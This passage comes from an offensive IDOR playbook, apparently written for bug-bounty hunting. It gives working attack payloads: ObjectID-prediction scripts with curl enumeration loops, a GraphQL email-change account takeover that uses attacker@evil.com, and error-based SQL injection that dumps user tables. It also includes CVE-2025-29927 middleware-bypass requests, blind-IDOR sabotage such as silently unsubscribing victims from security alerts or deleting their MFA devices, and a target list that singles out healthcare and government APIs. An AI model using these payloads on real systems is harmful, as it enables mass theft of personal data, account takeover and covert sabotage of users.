# Millisecond timestamps (more IDs, still enumerable within short window):
GET /api/sessions/1695574808123 HTTP/1.1
# Sweep: From: 1695574808000 To: 1695574808999 Step: 1 (1000 requests = 1 second of ms)

# High-value targets with timestamp IDs:
# - Password reset tokens
# - Email verification links
# - Temporary download links
# - Session tokens generated at login
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References

---

## MongoDB ObjectID Prediction
**Reference type:** MongoDB ObjectID (12-byte structured identifier)
**API pattern:** REST / GraphQL
**Authorization flaw:** MongoDB ObjectIDs are not random — they encode creation timestamp, machine identifier, process ID, and an incrementing counter. An attacker who possesses one ObjectID can derive: (1) the exact creation time, (2) approximate IDs of objects created around the same time (same machine/process → counter differs by small delta). No ownership check prevents fetching other objects whose ObjectIDs fall within the predictable range.
**Escalation:** Horizontal
**Business impact:** Mass enumeration of any MongoDB-backed object (user records, orders, messages, files) without requiring random ID brute-force. Single known ObjectID leaks the creation-time anchor for targeted enumeration.
**Test payload:**
```
# MongoDB ObjectID structure (24-char hex = 12 bytes):
# [4 bytes: Unix timestamp][3 bytes: machine ID][2 bytes: process ID][3 bytes: counter]
# Example: 507f1f77bcf86cd799439011
#   507f1f77  = timestamp (seconds since epoch)
#   bcf86c    = machine identifier
#   d799      = process ID
#   439011    = auto-incrementing counter

# Step 1: Extract creation timestamp from a known ObjectID
python3 -c "
from bson import ObjectId
oid = ObjectId('507f1f77bcf86cd799439011')
print('Created at:', oid.generation_time)
print('Timestamp:', int(oid.generation_time.timestamp()))
"
# → Created at: 2012-10-17 20:27:35+00:00

# Step 2: Generate ObjectIDs for adjacent seconds (same machine/process, counter varies)
python3 -c "
from bson import ObjectId
import datetime
# Generate ObjectID for 5 minutes before the known one
target_time = datetime.datetime(2012, 10, 17, 20, 22, 35)
fake_oid = ObjectId.from_datetime(target_time)
print(fake_oid)  # → 507f0bfb0000000000000000 (anchor for enumeration)
"

# Step 3: Enumerate by varying the counter bytes (same timestamp/machine/process)
# Counter range: 000000 → ffffff (16M possibilities, but practically 1-1000 per second)
# Base OID with counter sweep:
# 507f1f77bcf86cd799439011  ← known
# 507f1f77bcf86cd799439010  ← counter-1 (object created just before)
# 507f1f77bcf86cd799439012  ← counter+1 (object created just after)
# 507f1f77bcf86cd799439000  ← start of same second
# 507f1f77bcf86cd799439fff  ← end of same second

# Step 4: Test adjacent ObjectIDs via API
GET /api/users/507f1f77bcf86cd799439010 HTTP/1.1
GET /api/users/507f1f77bcf86cd799439012 HTTP/1.1
Authorization: Bearer <your-token>

# Step 5: For timestamp-range enumeration, generate all ObjectIDs in a window:
python3 -c "
from bson import ObjectId
import datetime
start = datetime.datetime(2023, 1, 1, 0, 0, 0)
for s in range(3600):  # 1 hour window
    t = start + datetime.timedelta(seconds=s)
    print(ObjectId.from_datetime(t))
" | while read oid; do
  curl -s -H "Authorization: Bearer <token>" https://target.com/api/orders/$oid
done

# Burp: use generated ObjectID list as payload in Intruder
# Key indicator: ObjectID ends in 000000 → generated synthetically (no counter → enumeration anchor)
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References

---

## Threat Model

> Current patterns as of 2026-05-28. Update each session.

**What's being exploited in the wild:**

1. **API versioning bypass** — The #1 underappreciated IDOR vector. v1/v0/internal/
   legacy/mobile endpoints consistently lack authorization that v2/v3 endpoints have.
   Accounts for a large percentage of high-severity HackerOne IDOR reports.

2. **GraphQL IDOR at scale** — As more APIs migrate to GraphQL, IDOR in mutations is
   extremely common. Developers implement query-level auth but forget mutation-level.
   Batch queries allow mass enumeration in a single request. GraphQL subscriptions are
   the newest blind spot — subscription resolvers routinely lack the ownership checks
   present in query/mutation resolvers.

3. **Bulk operations skip per-object auth** — `DELETE /api/items` with a body of IDs
   almost never validates each ID against the session. Affects archiving, exporting,
   tagging, and batch-status-change features.

4. **Tenant isolation in SaaS** — Multi-tenant SaaS platforms are a goldmine. org_id
   or company_id parameters passed in request body or headers — if not validated against
   JWT claims — allow cross-tenant data access. This is a critical vulnerability in B2B
   platforms.

5. **Mobile API lag** — Mobile apps often communicate with `/api/mobile/` or `/api/v1/`
   endpoints that have fewer auth checks than the web app's API. Always intercept mobile
   app traffic (use Frida or HTTP proxy on device) separately from web.

6. **WebSocket message-level IDOR** — WebSocket auth happens at handshake; per-message
   object-level checks are almost universally missing. Real-time apps (chat, trading,
   dashboards) built on WebSockets are systematically vulnerable. A valid session cookie
   is all you need to subscribe to any user's private data stream.

7. **Pre-signed object storage IDOR** — Cloud-native apps offload file delivery to S3/GCS
   signed URLs. The endpoint that generates the signed URL frequently checks authentication
   but not ownership of the object key. Any file key is accessible to any authenticated
   user. Common in document-sharing, invoicing, and healthcare SaaS platforms.

8. **Type coercion bypasses (array wrapping, content-type switching)** — Authorization
   middleware that validates a scalar `id` field will often pass when the same ID is
   wrapped in a JSON array (`[id]`) or when the content type is switched from JSON to
   XML/form-encoded. These simple one-character changes evade a surprising number of
   access control implementations.

9. **GraphQL-WS hidden operations** (NEW 2026-05) — Persistent `/graphql-ws` endpoints
   frequently support undocumented GraphQL operations exposed only in client-side JS
   bundles. These hidden operations skip ownership validation because they were never
   tested as a public attack surface. When object IDs have high entropy that prevents
   brute-forcing, the same ID parameter is often SQL-injectable — IDOR + SQLi in a single
   chain. Always analyze `main.js` and JS chunks for GraphQL operation strings.

10. **Unauthenticated GraphQL endpoints** (NEW 2026-05) — A surprising number of
    production GraphQL endpoints require no auth token at all, exposing admin profiles,
    user roles, and PII to unauthenticated callers. Always send a GraphQL query with zero
    auth headers as the first test on any newly discovered `/graphql` endpoint.

11. **Industry distribution (HackerOne 2025 data)** — IDOR is the top vulnerability
    class in: medical technology (36% of all bounty reports), professional services (31%),
    government platforms (18%), and retail/e-commerce (15%). MedTech is the highest-ratio
    industry — target healthcare SaaS, lab management systems, and patient-portal APIs for
    highest probability of finding critical IDOR findings.

12. **Alternative numeric ID representations** (NEW 2026-05) — ACL middleware often
    validates that an ID is numeric and belongs to the session user using an equality check
    on the decimal form. Submitting the same ID as hexadecimal (`0x4642d`), as a Unix
    timestamp, or exploiting predictable MongoDB ObjectID counter bytes bypasses these
    guards because the format check fails before ownership is ever verified. These are
    low-effort, high-yield bypasses on any platform using MongoDB or timestamp-based IDs.

13. **Blind IDOR (write-only side-effect)** (NEW 2026-05) — As direct data-disclosure
    IDORs get patched, write-only IDORs are increasingly the surviving attack surface.
    Unsubscribing victims from security alerts, deleting their saved content, or revoking
    their sessions via IDOR produces no discriminating server response — the attacker sees
    only a 204 or `{"success": true}`. These are systematically missed by automated
    scanners and diff-based IDOR tools because there's nothing to compare in the response.

14. **Soft-delete ACL gap** (NEW 2026-05) — Developers who implement soft-delete (logical
    flag) consistently forget to enforce object ownership checks on the deleted-state API
    paths. Items in "trash" or "recently deleted" collections are assumed inaccessible,
    so authorization middleware is never applied. Direct API calls bypass the UI and reach
    the soft-deleted object with no ownership validation. Deleted content often contains
    the most sensitive data users thought they had purged.

15. **Share link generation IDOR** (NEW 2026-05) — Resource sharing endpoints that
    generate public share URLs are almost universally checked for authentication only, not
    ownership. Authenticated attacker creates a share link for any resource by supplying
    its ID — then distributes the link to expose victim's private data to external parties.
    Facebook Business Manager: $5,375 bounty (July 2025). Any `/api/*/share`, `/generate-
    link`, or `/create-share-token` endpoint is a high-priority test target.

16. **Next.js middleware bypass (CVE-2025-29927)** (NEW 2026-05) — The `x-middleware-
    subrequest` header in Next.js is trusted without origin verification. Adding it to any
    inbound request causes the framework to skip all middleware — bypassing authentication,
    RBAC, rate limiting, and IP filtering in a single header. CVSS 9.1; affects all self-
    hosted Next.js before 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3. Disclosed March 2025.
    Vercel-hosted deployments are automatically patched; Docker/Node self-hosted are
    exposed. Check for `x-powered-by: Next.js` to identify targets.

17. **AI/chatbot backend API IDOR** (NEW 2026-05) — AI chatbot platforms (Paradox, Intercom,
    Drift, Kore.ai) expose internal REST endpoints that process conversation records by
    sequential numeric IDs with no object-level authorization. These endpoints are assumed
    internal-only and never security-tested. Real-world: McHire/McDonald's (June 2025) —
    64 million applicant records exposed by decrementing a single `lead_id`. Any chatbot-
    powered application is now a priority target for IDOR.

18. **Cursor/pagination token IDOR** (NEW 2026-05) — Cursor tokens in paginated APIs encode
    user scope (userId, tenantId, last-seen object ID) into base64 or JWT structures. Servers
    trust the cursor without re-validating session ownership. Decode, substitute victim userId,
    re-encode → full access to victim's paginated data stream. Affects GraphQL Relay
    (endCursor), Elasticsearch scroll, MongoDB resume_token, and any `page_token` / `after`
    / `continuation_token` parameter.

---

## Bypass Matrix

| Protection Mechanism | Bypass Technique |
|---------------------|-----------------|
| Endpoint checks auth | Try older API version (v1, v0, /internal/, /legacy/) |
| UUID (hard to guess) | Find UUID in email, JS, API response body, or info disclosure |
| 403 on GET | Try PUT, PATCH, DELETE, POST on same path |
| 403 on path param | Try same ID in query string, request body, or header |
| Object scoped to org | Modify org_id / tenant_id / company_id param |
| Rate limited enumeration | Use GraphQL aliases to batch in one request |
| Authorization middleware | Try missing auth header entirely (some bypass auth entirely) |
| Per-object check on v2 | Same endpoint on v1/v0/internal/mobile |
| Sequential IDs monitored | Use existing leaked IDs from emails, JS, error messages |
| Response is 404 not 403 | Still attempt write methods (PUT/DELETE) — 404 may be fake |
| Scalar ID validation | Wrap ID in array: `{"id": [1002]}` — coercion bypasses ACL |
| JSON content-type check | Switch to XML, text/plain, or form-encoded body |
| Path-based ACL | Append file extension: `/resource/1002.json` instead of `/resource/1002` |
| Canonical param name ACL | Substitute alias: `album_id` → `collection_id`, `folder_id`, `id` |
| WebSocket session auth | Send victim's object ID in message body after your own handshake |
| GraphQL query/mutation ACL | Subscribe to victim's events via subscription resolver (often unprotected) |
| Presigned URL ownership | Request `/api/files/presign` with victim's object key |
| High-entropy object IDs | SQL-inject the same ID parameter — entropy prevents brute force, not injection |
| GraphQL endpoint (auth assumed) | Send GraphQL query with NO Authorization header — endpoint may be fully public |
| Operations not in GraphQL schema | Analyze client JS bundles for unlisted operation names on `/graphql-ws` |
| Integer-format ACL guard | Submit ID in hex: `0x4642d` — ORM resolves to same row, ACL skips non-decimal input |
| Numeric ID seems random | Check if it's a Unix timestamp — enumerate ±N seconds around a known anchor |
| MongoDB ObjectID (hard to guess) | Extract timestamp from known ObjectID; sweep counter bytes of same timestamp/machine/process |
| Write-only endpoint — no data in response | Confirm with two-account testing: observe side effect on victim account (item deleted, email suppressed) |
| Object is "deleted" — assumed inaccessible | Call API directly with deleted object ID — soft-delete flag in DB doesn't remove ownership check unless explicitly coded |
| Share link creation requires ownership | Submit another user's resource ID to the share link endpoint — auth check only, not ownership |
| Next.js middleware enforces auth | Add `x-middleware-subrequest: middleware` header — skips all middleware (CVE-2025-29927, CVSS 9.1) |
| Chatbot/AI platform "internal" API | Intercept chatbot XHR in Burp — sequential `lead_id` / `session_id` in internal endpoints → decrement to enumerate all records |
| Opaque cursor / pagination token | Decode base64 cursor, modify `userId` / `tenantId` / `lastId`, re-encode — pagination scope not re-validated against session |

---

## High-Value Targets

| Target | IDOR Type | Impact |
|--------|-----------|--------|
| `/api/admin/users` | Vertical | All user PII, role manipulation |
| `/api/org/{id}/members` | Tenant isolation | Competitor's org data |
| `/api/invoices/{id}/download` | Horizontal | Financial documents, PII |
| `/api/users/{id}/sessions` | Horizontal | Active session list → session fixation |
| `/api/exports/job_{id}` | Async queue | Data export of another user |
| `/api/v1/users/{id}` (vs v2) | API version | Unprotected legacy endpoint |
| GraphQL `deletePost(id:)` mutation | GraphQL | Delete another user's content |
| `/api/2fa/backup-codes` | Horizontal | Bypass 2FA → full ATO |
| `/api/webhooks/{id}` | Horizontal | Change webhook URL → SSRF |
| `/api/payment-methods/{id}` | Horizontal | Financial data, charge trigger |
| Batch delete `{"ids": [...]}` | Bulk | Cross-user deletion |
| `/api/team/invite/{token}` | Horizontal | Accept invite meant for others |
| `/api/files/presign` or `/api/download` | Pre-signed URL | Private file access (S3/GCS/Azure) |
| WebSocket `/ws` + message `user_id` | WebSocket | Real-time private data stream |
| GraphQL subscription `newNotification(userId:)` | GraphQL subscription | Live event stream exfiltration |
| `/api/users/*` wildcard | Wildcard injection | Mass user data exposure |
| Recently released feature endpoints | New feature | Immature access controls, highest ratio |
| `/graphql-ws` hidden operations | GraphQL-WS IDOR | Private docs/records; chain to SQLi for entropy bypass |
| `/api/v1/schedules?projectId=` | Scheduled job IDOR | Cross-org pipeline configs, credentials, output data |
| MedTech / patient-portal APIs | Any IDOR type | 36% of MedTech bounties are IDOR — highest-ratio industry |
| Government platform APIs | Any IDOR type | 18% of gov bounties — high-value PII, citizen records |
| Any endpoint with numeric ID in hex range | Hex ID bypass | ACL skips non-decimal input; ORM fetches object normally |
| Password reset / session endpoints with timestamp IDs | Timestamp enumeration | Deterministic IDs enable targeted window sweep → ATO |
| MongoDB-backed `/api/users/{objectId}` | ObjectID prediction | Counter bytes enumerable → cross-user data access |
| AI/chatbot backend (`/api/lead/`, `/api/sessions/`, `/api/conversations/`) | Sequential integer | Chat transcripts, applicant PII, session tokens — McHire: 64M records (2025) |
| Share link endpoints (`/api/*/share`, `/generate-link`, `/create-share-token`) | Numeric / GUID | Private resource distributed to external parties without victim consent |
| Recently deleted / trash (`/api/trash`, `/api/posts?status=deleted`) | Numeric / GUID | Sensitive deleted content assumed inaccessible; ACL stripped on soft-delete |
| Next.js middleware-protected routes (any path on unpatched self-hosted Next.js) | Route-level bypass | CVE-2025-29927 — all auth/RBAC bypassed with one header; CVSS 9.1 |
| Cursor/pagination endpoints (`?cursor=`, `?after=`, `?page_token=`) | Encoded token | Full cross-user data stream access via decoded and re-encoded cursor |
| Write-only / side-effect endpoints (unsubscribe, delete, mark-read, revoke) | Numeric / GUID | Blind IDOR: silent sabotage with no visible attacker-side data leak |

---

## Real-World Chains

### Chain 1: IDOR + API v1 Bypass → Full User Data Dump

```
1. Register as a standard user on a SaaS platform
2. Observe: GET /api/v2/users/1002 → 403 (properly protected)
3. Try: GET /api/v1/users/1002 → 200 (legacy endpoint, no auth check)
4. Discover v1 returns: email, phone, address, payment_method_last4, account_balance
5. Enumerate: GET /api/v1/users/1 through /1000 with Burp Intruder
6. Extract full PII database for all users

Impact: Critical — mass PII exposure
Report note: always check Wayback Machine and JS files for old API paths
```

### Chain 2: GraphQL Mutation IDOR → Account Takeover

```graphql
# 1. Discover updateUserEmail mutation via introspection
mutation {
  __type(name: "Mutation") { fields { name } }
}
# → finds: updateUserEmail(userId: ID!, email: String!): User

# 2. Normal use:
mutation { updateUserEmail(userId: "1001", email: "me@example.com") { success } }
# → 200 OK

# 3. IDOR: update another user's email
mutation { updateUserEmail(userId: "1002", email: "attacker@evil.com") { success } }
# → 200 OK (no ownership check on userId)

# 4. Trigger password reset for attacker@evil.com → attacker receives reset link
# 5. Reset password → full account takeover

Impact: Critical — ATO on any account
```

### Chain 3: IDOR in Async Export → Competitor Data Exfil

```
1. Request data export for your account:
   POST /api/exports {"type": "all_data"} → {"job_id": "export_9182"}

2. Notice job_id is sequential (or predictable)

3. Poll adjacent job IDs:
   GET /api/exports/export_9181/status → {"status": "complete", "owner": "acme-corp"}
   GET /api/exports/export_9181/download → Downloads acme-corp's full data export

4. No ownership check on the /download endpoint — any authenticated user can fetch any job

Impact: Critical — mass data exfiltration, B2B SaaS scenario
```

### Chain 4: Tenant IDOR → Cross-Org Data Access → Lateral Movement

```
1. Sign up for SaaS platform — receive JWT containing:
   {"sub": "user123", "org": "attacker-corp", "role": "admin"}

2. Test: GET /api/org/victim-corp/reports
   Authorization: Bearer <attacker-corp JWT>
   → Returns victim-corp's reports (org param not validated against JWT)

3. Read victim-corp's internal data → extract user list + contact info

4. Use contact info for spear phishing against victim-corp employees
   → Compromise victim-corp account → lateral movement within platform

Impact: Critical — cross-tenant data breach in SaaS
```

### Chain 5: IDOR on 2FA Backup Codes → ATO on High-Value Account

```
1. Find: GET /api/users/{id}/2fa/backup-codes (requires auth, but no ownership check)
2. Identify high-value target user ID (from public profile, API response, enumeration)
3. Fetch their backup codes:
   GET /api/users/42/2fa/backup-codes → ["XXXX-YYYY", "AAAA-BBBB", ...]
4. Try to log in as victim (need their email — find via another IDOR or info disclosure)
5. Use backup code when 2FA is requested → bypasses 2FA
6. Full account takeover even with 2FA enabled

Impact: Critical — complete bypass of 2FA protection
```

### Chain 6: WebSocket IDOR → Real-Time Private Data Exfiltration

```
1. Open Burp Suite, enable WebSocket interception
   Navigate to the real-time feature (live chat, dashboard, trading view)

2. Observe the WebSocket handshake:
   GET /ws HTTP/1.1
   Cookie: session=<your-session>
   → Connection established

3. Observe initial subscription message sent by client:
   {"action": "subscribe", "channel": "user_feed", "user_id": "1001"}
   → Server responds with your real-time events

4. Intercept next message, modify user_id to another account:
   {"action": "subscribe", "channel": "user_feed", "user_id": "1002"}
   → Server sends user 1002's live feed (no per-message ownership check)

5. Exfiltrate in real-time: order placements, messages, notifications,
   financial transactions, location updates

6. Chain with account enumeration: iterate user_id from 1 to N in a loop
   wscat -c wss://target.com/ws --header "Cookie: session=<yours>"
   > {"action":"subscribe","channel":"user_feed","user_id":1002}
   > {"action":"subscribe","channel":"user_feed","user_id":1003}

Impact: Critical — real-time mass data exfiltration with a single valid session
Note: WebSocket IDOR is often missed because Burp's scanner doesn't cover WS messages
```

### Chain 7: Pre-Signed URL IDOR → Private File Download → PII Mass Exfil

```
1. Trigger a file download in the app for your own account:
   POST /api/files/presign {"key": "invoices/user_1001/Q1_2026.pdf"}
   → {"signed_url": "https://bucket.s3.amazonaws.com/invoices/user_1001/Q1_2026.pdf?X-Amz-Signature=abc..."}

2. Note the object key pattern: invoices/user_{id}/Q{quarter}_{year}.pdf

3. Request a signed URL for another user's object key:
   POST /api/files/presign {"key": "invoices/user_1002/Q1_2026.pdf"}
   → If server returns a valid signed URL: IDOR confirmed

4. Enumerate: generate signed URLs for user_1001 through user_5000
   All quarterly invoices accessible with no additional auth

5. Download each file directly using the time-limited signed URL
   (AWS signs the URL server-side — the download itself is unauthenticated)

Impact: Critical — financial document mass exfiltration
Detection evasion: downloads appear to come from legitimate AWS/GCS infrastructure
```

### Chain 8: GraphQL-WS Hidden Operations IDOR → SQL Injection → Full PII Exfiltration

```
1. Open Burp Suite, enable WebSocket interception, browse the target app
   Identify persistent WebSocket connection: wss://target.com/graphql-ws

2. Analyze client-side JS bundle for hidden GraphQL operation names:
   grep -E "gql`|query\s+[A-Z]|mutation\s+[A-Z]" main.js
   → Discover undocumented: GetDocument, LockDocument, ListDocumentsByUser
   (these operations don't appear in the public schema or API docs)

3. Connect to graphql-ws and send connection_init with your token:
   {"type": "connection_init", "payload": {"authorization": "Bearer <your-token>"}}
   → Receive: {"type": "connection_ack"}

4. Invoke hidden operation with your own document ID (confirm it works):
   {"id":"1","type":"start","payload":{"query":"query { document(id: \"YOUR_DOC_ID\") { content owner } }"}}
   → Returns your document — operation is live and functional

5. Swap to another user's document ID:
   {"id":"2","type":"start","payload":{"query":"query { document(id: \"VICTIM_DOC_ID\") { content owner } }"}}
   → Returns victim's document (no ownership check) — IDOR confirmed at graphql-ws level

6. Complication: document IDs are 25-digit high-entropy numeric strings
   Brute-force is infeasible. Normal IDOR enumeration fails here.

7. Escalate — SQL inject the document ID parameter:
   {"id":"3","type":"start","payload":{"query":"query { document(id: \"1 OR 1=1 LIMIT 1--\") { content owner } }"}}
   → Returns a document belonging to a random user — SQLi confirmed, entropy bypassed

8. Error-based PostgreSQL extraction — exfil user PII via error messages:
   {"id":"4","type":"start","payload":{"query":"query { document(id: \"1 AND CAST((SELECT email||chr(58)||name FROM users LIMIT 1 OFFSET 0) AS INT)--\") { content } }"}}
   → Server error: 'invalid input syntax for type integer: "victim@corp.com:John Doe"'

9. Iterate OFFSET to dump full user table:
   OFFSET 0 → user 1 email:name
   OFFSET 1 → user 2 email:name
   ... enumerate all users in a single authenticated WebSocket session

Impact: Critical — full PII database exfiltrated via a single valid session token
Key insight: "High-entropy IDs protect against enumeration" is NOT a substitute for
object-level authorization. The same parameter used for IDOR can accept SQL injection.
Always test injection in ID parameters even when brute-force is infeasible.
Source: https://medium.com/@DarkyOS/sql-injection-in-graphql-websocket-escalated-to-pii-document-leak-09ba7ad2800a
```

### Chain 9: CVE-2025-29927 + IDOR → Unauthenticated Admin Access on Next.js

```
1. Fingerprint Next.js: look for "x-powered-by: Next.js" in response headers,
   "__nextjs" cookies, or /_next/static/ paths in page source

2. Test CVE-2025-29927 middleware bypass:
   GET /admin/dashboard HTTP/1.1
   Host: target.com
   x-middleware-subrequest: middleware
   → If 200 OK instead of 302/401 → all middleware skipped, auth bypass confirmed

3. Access admin API routes without any token:
   GET /api/admin/users HTTP/1.1
   x-middleware-subrequest: middleware
   → Returns all user records (vertical escalation, no token required)

4. Access any user's data directly:
   GET /api/users/1002/profile HTTP/1.1
   x-middleware-subrequest: middleware
   → Full PII returned (horizontal IDOR, no authentication at all)

5. Enumerate all users:
   Burp Intruder: GET /api/users/§id§/profile with x-middleware-subrequest: middleware
   → Complete user database exposed with zero credentials

Impact: Critical — full authentication + authorization bypass on any unpatched
self-hosted Next.js (< 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3)
Note: Vercel-hosted apps are auto-patched; self-hosted Docker/Node deployments are primary targets
CVE: CVE-2025-29927, CVSS 9.1
```

---

## Blind IDOR (Write-Only / Side-Effect IDOR)
**Reference type:** Numeric / GUID
**API pattern:** REST
**Authorization flaw:** The server performs a write operation on a foreign object without checking ownership but returns no discriminating data in the response — only a 204, a `{"success": true}`, or the attacker's own data. The impact is visible only as a side effect from the victim's perspective: their item disappears, their security alert is suppressed, their notification is marked read, or their MFA device is deleted. These actions are typically harder to detect in server logs than data-disclosure IDORs because the response reveals nothing to the attacker.
**Escalation:** Horizontal
**Business impact:** Silent sabotage — unsubscribe victims from security alerts, delete their saved data, corrupt preferences, revoke their sessions — all without triggering server-side data leakage alarms. Higher severity than read-only IDOR on platforms with poor write-action auditing.
**Test payload:**
```http
# Unsubscribe another user from security email notifications:
POST /api/notifications/unsubscribe HTTP/1.1
Authorization: Bearer <your-token>
Content-Type: application/json
{"user_id": 1002, "type": "security_alerts"}
→ 200 OK {"success": true}   ← victim silently stopped receiving security alerts

# Delete another user's saved item (no visible data to attacker):
DELETE /api/saved_items/9182 HTTP/1.1
Authorization: Bearer <your-token>
→ 204 No Content   ← item removed from victim's saved list

# Mark another user's notifications as read (suppress security notices):
POST /api/notifications/mark_read HTTP/1.1
Authorization: Bearer <your-token>
{"notification_ids": [8801, 8802, 8803], "user_id": 1002}
→ 200 OK   ← victim's unread count drops silently

# Verify the blind IDOR worked via two-account testing:
# Account A (attacker): send request with victim's ID
# Account B (victim): log in and observe whether item/notification/preference changed
# A status change in Account B confirms the blind IDOR

# High-value blind IDOR targets:
# - Email/SMS notification unsubscribe endpoints
# - Session revocation: DELETE /api/sessions/sess_abc123
# - MFA device removal: DELETE /api/users/1002/mfa
# - Password reset invalidation: POST /api/password_reset/invalidate
# - Account lockout triggering: POST /api/auth/failed_attempt {"user_id": 1002}
```
**Source:** https://medium.com/@sagarsajeev/unsubscribe-any-users-e-mail-notifications-via-idor-2c2e05b79dac

---

## IDOR in Soft-Deleted / Recently Deleted Objects
**Reference type:** Numeric / GUID
**API pattern:** REST / GraphQL
**Authorization flaw:** When an object is soft-deleted (flagged `deleted=true` or `status='deleted'` but not removed from the database), developers remove the item from the UI without updating the ACL logic. API endpoints that serve deleted/archived objects check authentication but not ownership of the deleted resource — the assumption being that "deleted" items are inaccessible anyway. The gap: ACL is enforced on the live object, not the deleted copy.
**Escalation:** Horizontal
**Business impact:** Access to another user's deleted content — which often contains the most sensitive data: deleted messages, removed financial records, revoked tokens, withdrawn job applications, purged credentials. Deleted ≠ inaccessible without explicit ACL on the deleted state.
**Test payload:**
```http
# Step 1: Create and delete your own object, observe the deletion is soft
DELETE /api/posts/9001 HTTP/1.1
Authorization: Bearer <your-token>
→ 200 OK {"deleted": true, "id": 9001}   ← soft delete, stays in DB

# Step 2: Confirm the deleted object is still API-accessible:
GET /api/posts/9001 HTTP/1.1
Authorization: Bearer <your-token>
→ 200 OK {"id": 9001, "status": "deleted", "content": "..."}
# Item accessible via API even though removed from UI

# Step 3: Access another user's deleted object:
GET /api/posts/9000 HTTP/1.1   ← another user's deleted post
Authorization: Bearer <your-token>
→ If 200 OK → IDOR on soft-deleted object confirmed

# Step 4: Test the trash / recently-deleted collection endpoint:
GET /api/trash HTTP/1.1
Authorization: Bearer <your-token>
→ Should return only your own deleted items

GET /api/trash?user_id=1002     ← inject another user's ID
GET /api/recently_deleted/9000  ← direct access by ID
GET /api/posts?status=deleted&user_id=1002

# Step 5: Also test restore and permanent-delete endpoints on other users' deleted items:
POST /api/posts/9000/restore HTTP/1.1   ← restore victim's deleted post (now visible in their feed)
DELETE /api/posts/9000/permanent HTTP/1.1  ← permanently delete victim's data

# Soft-delete indicators in API responses to look for:
# "deleted_at": "2025-05-28T10:00:00Z"
# "status": "archived" / "deleted" / "trashed"
# "is_deleted": true / "soft_deleted": 1
```
**Source:** https://medium.com/@0x1di0t/undeleted-secrets-uncovering-an-idor-vulnerability-in-recently-deleted-items-6d35db221008

---

## IDOR in Share Link / Resource Sharing Endpoint
**Reference type:** Numeric / GUID
**API pattern:** REST
**Authorization flaw:** The endpoint that generates a shareable link for a resource checks only that the requester is authenticated, not that they own the resource. Any authenticated user can produce a valid public share link for any object by supplying its ID — then distribute that link to external parties who can access the victim's private content without the victim or platform knowing the attacker was the link creator.
**Escalation:** Horizontal
**Business impact:** Attacker generates and distributes share links for another user's private resources (campaign plans, business reports, documents, dashboards). Private strategy or financial data reaches external parties. In the Facebook Business Manager case (July 2025): $5,375 bounty for share link creation on any campaign planner without ownership.
**Test payload:**
```http
# Normal flow: Create share link for YOUR resource:
POST /api/campaign_plans/share HTTP/1.1
Content-Type: application/json
Authorization: Bearer <your-token>
{"plan_id": "CP-1001"}
→ {"share_url": "https://target.com/shared/abc123", "expires_in": 7776000}

# IDOR: Substitute another user's resource ID:
POST /api/campaign_plans/share HTTP/1.1
Content-Type: application/json
Authorization: Bearer <your-token>
{"plan_id": "CP-1002"}   ← another user's resource ID
→ {"share_url": "https://target.com/shared/xyz999"}
# IDOR confirmed: attacker holds a valid share link to victim's private resource

# Verify the link exposes victim's data without authentication:
GET https://target.com/shared/xyz999
(no Authorization header)
→ Returns victim's private campaign content → Critical IDOR

# Generalize to other share/export/invite-link endpoints:
POST /api/reports/{report_id}/share
POST /api/documents/{doc_id}/generate-link
POST /api/projects/{project_id}/public-link
GET  /api/share?resource_id=DOC-9982&type=document
POST /api/dashboards/1002/share-token
POST /api/folders/9982/create-share-link

# Write IDOR variant — attacker creates then revokes victim's share links:
DELETE /api/shared-links/xyz999   ← revokes another user's existing share link
```
**Source:** https://medium.com/@muriarfad/5375-bounty-idor-creating-a-share-link-for-any-campaign-planner-in-facebook-business-03f0994d4d16

---

## Next.js Middleware Authorization Bypass (CVE-2025-29927)
**Reference type:** Route-level (any protected path)
**API pattern:** REST (Next.js framework, any self-hosted deployment)
**Authorization flaw:** Next.js uses an internal header `x-middleware-subrequest` to mark server-initiated sub-requests so middleware is not re-executed (preventing infinite loops). This header is trusted without verifying its origin. Any externally-supplied request that includes this header causes the Next.js runtime to skip all middleware — bypassing every authentication gate, RBAC check, rate limiter, and IP allow-list implemented in middleware.js.
**Escalation:** Vertical (admin route bypass) + Horizontal (any user's data, no token needed)
**Business impact:** Complete bypass of all Next.js middleware-based access controls. Every `/api/` route, admin panel, and protected page becomes unauthenticated. Affects all self-hosted Next.js before 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3. CVSS 9.1. Disclosed March 2025. Vercel-hosted deployments are automatically patched.
**Test payload:**
```http
# Without bypass — protected route returns redirect/401:
GET /admin/dashboard HTTP/1.1
Host: target.com
→ 302 Redirect to /login

# CVE-2025-29927 bypass — skip all middleware:
GET /admin/dashboard HTTP/1.1
Host: target.com
x-middleware-subrequest: middleware
→ 200 OK (admin panel served with no auth check)

# Try alternate header values (map to middleware file path):
x-middleware-subrequest: src/middleware
x-middleware-subrequest: pages/_middleware
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware

# Target admin and internal API routes:
GET /api/admin/users HTTP/1.1
x-middleware-subrequest: middleware
→ 200 OK — all user records, no auth

GET /api/internal/config HTTP/1.1
x-middleware-subrequest: middleware
→ Secrets, feature flags, internal config

# IDOR via bypass: access any user's data without a token:
GET /api/users/1002/profile HTTP/1.1
x-middleware-subrequest: middleware
→ Full PII, no Authorization header needed

# Fingerprint Next.js before testing:
# - Response header: x-powered-by: Next.js
# - URL paths: /_next/static/, /_next/image
# - Cookie names starting with __nextjs or __Host-next-auth

# Affected versions: < 12.3.5, < 13.5.9, < 14.2.25, < 15.2.3 (self-hosted only)
# Mitigation: upgrade; or configure reverse proxy to strip x-middleware-subrequest from inbound requests
```
**Source:** CVE-2025-29927 — https://nvd.nist.gov/vuln/detail/CVE-2025-29927; https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/

---

## IDOR in AI/Chatbot Backend APIs
**Reference type:** Sequential integer (`lead_id`, `session_id`, `conversation_id`)
**API pattern:** REST (internal API endpoints of AI chatbot platforms)
**Authorization flaw:** AI-powered chatbot platforms (hiring bots, support agents, customer service bots) expose internal REST endpoints that retrieve conversation records by sequential numeric identifiers. These endpoints authenticate via session token or API key but perform no object-level authorization — any session can fetch any conversation by ID. The endpoints are obscured (paths like `/api/lead/cem-xhr`, `/internal/`, `/api/chat/sessions/`) and assumed internal-only, so they are rarely added to bug bounty scope or tested by security teams.
